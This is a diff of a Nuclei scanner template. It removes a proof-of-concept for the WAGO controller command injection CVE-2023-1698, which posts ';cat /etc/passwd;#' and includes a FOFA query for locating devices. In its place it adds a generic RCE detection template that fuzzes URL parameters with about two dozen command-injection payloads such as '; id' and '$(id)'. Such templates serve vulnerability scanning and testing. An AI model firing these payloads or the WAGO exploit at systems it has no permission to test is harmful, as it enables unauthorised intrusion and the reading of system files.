@@ -1,42 +1,56 @@
-id: rce
+id: RCE
+
+# Usage: 
+# echo "http://testphp.vulnweb.com/listproducts.php?cat=" | nuclei -t rce.yaml | awk '{print $6}'
 
 info:
-  name: WAGO系统 远程代码执行漏洞复现(CVE-2023-1698)
-  author: k3ppf0r 
-  severity: high 
-  description: |
-    在 WAGO 的多个产品中，一个漏洞允许未经身份验证的远程攻击者创建新用户并更改设备配置，可导致远程RCE、拒绝服务等使整个系统受损。
-  remediation: |
-    1、待官方发布后升级至安全版本
-    2、利用安全组设置其仅对可信地址开放。
-  classification:
-    cvss-metrics: CVSS
-    cvss-score: 9
-    cve-id: rce
-    cwe-id: CWE-434
-    # cpe: # 可选：cpe:2.3:a:vmware:spring_cloud_function:*:*:*:*:*:*:*:*
-  metadata:
-    date: 2024-04-17
-    version: 751-9301 Compact Controller CC100 FW20 <= FW22 
-    fofa-query: icon_hash="851034826"
-  tags: cve,cve2024,rce
+  name: Remote Code Execution (RCE) Detection
+  author: 25
+  severity: high
+  tags: rce
 
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
 
-http:
-  - raw:
-    - |
-      POST /wbm/plugins/wbm-legal-information/platform/pfcXXX/licenses.php HTTP/1.1
-      Host: your-ip
-      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
-      Connection: close
-      Content-Type: application/x-www-form-urlencoded
-      Accept-Encoding: gzip, deflate
-      
-      {"package":";cat /etc/passwd;#"}
+    payloads:
+      injection:
+        - '| id'
+        - '; id'
+        - '&& id'
+        - '|| id'
+        - '$(id)'
+        - '`id`'
+        - '; system("id")'
+        - '; system("/usr/bin/id")'
+        - ';id;'
+        - '|id|'
+        - '|/usr/bin/id|'
+        - '||/usr/bin/id|'
+        - '%0Aid%0A'
+        - '%0A/usr/bin/id%0A'
+        - 'a);id'
+        - 'a);/usr/bin/id'
+        - 'a|id'
+        - 'a|/usr/bin/id'
+        - 'a;id'
+        - 'a;/usr/bin/id'
+        - '<?php system("id");?>'
+        - '"%2B`id`%2B"'
+        - '".system(%27id%27); $dummy="'
 
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{injection}}"
+
+    stop-at-first-match: true
+    matchers-condition: or
     matchers:
-      - type: dsl
-        dsl:
-          - status_code == 200
-          - contains(body, "root")
-
+      - type: regex
+        part: body
+        regex:
+          - 'uid=[0-9a-zA-Z_()-. ]+gid=[0-9a-zA-Z_()-. ]+'
